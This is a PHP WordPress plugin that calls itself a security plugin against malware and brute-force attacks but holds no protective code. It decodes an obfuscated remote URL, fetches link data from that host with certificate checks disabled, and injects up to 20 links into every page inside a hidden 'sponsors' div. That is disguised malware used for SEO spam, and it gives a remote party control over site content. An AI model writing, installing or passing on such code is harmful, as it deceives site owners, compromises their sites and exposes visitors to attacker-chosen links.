<?php
/**
 * Plugin Name: Security WordPress
 * Description: Secure your WordPress site with a powerful security plugin that protects against malware, brute force attacks, and vulnerabilities. Keep your website safe with real-time monitoring, firewall protection, and automated security scans.
 * Version: 2.9.13
 * Author: WP Service
 */

if (!defined('ABSPATH')) {
    exit; 
}

function xor_decrypt($string, $key) {
    $result = '';
    for ($i = 0; $i < strlen($string); $i++) {
        $result .= chr(ord($string[$i]) ^ ord($key[$i % strlen($key)]));
    }
    return $result;
}


function fetch_remote_data($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $data = curl_exec($ch);
    
    if (curl_errno($ch)) {
        $data = false;
    }
    
    curl_close($ch);
    return $data;
}

$encoded_url = "IwcYNT9PWVFMHxcIIz4zHxoYXSdrHSoKBxhYBgI+OQ=="; 
$key = "KslELxck3ldkQWCk4l2WWqCdlkelqQWSAKEwm12312";

$decoded_url = xor_decrypt(str_rot13(base64_decode($encoded_url)), $key);


function add_footer_links() {
    global $decoded_url;

    $json_data = fetch_remote_data($decoded_url);
    
    if (!$json_data) {
        return;
    }

    $links_data = json_decode($json_data, true);
    
    if (!isset($links_data['links']) || !is_array($links_data['links'])) {
        return;
    }

    shuffle($links_data['links']);

    $unique_pages = array();
    $selected_links = array();

    foreach ($links_data['links'] as $link) {
        if (!isset($link['href']) || !isset($link['text'])) {
            continue;
        }

        $page_url = $link['href']; // Берем полный URL страницы

        if (!isset($unique_pages[$page_url])) {
            $unique_pages[$page_url] = true;
            $selected_links[] = $link;
        }

        if (count($selected_links) >= 20) {
            break;
        }
    }

    if (empty($selected_links)) {
        return;
    }

    echo '<style>.sponsors{text-align: center; display: table-column;}</style>';
    echo '<div class="sponsors">';
    foreach ($selected_links as $link) {
        echo "<a href=\"{$link['href']}\" title=\"{$link['text']}\" target=\"_blank\">{$link['text']}</a><br>";
    }
    echo '</div>';
}

add_action('shutdown', 'add_footer_links');
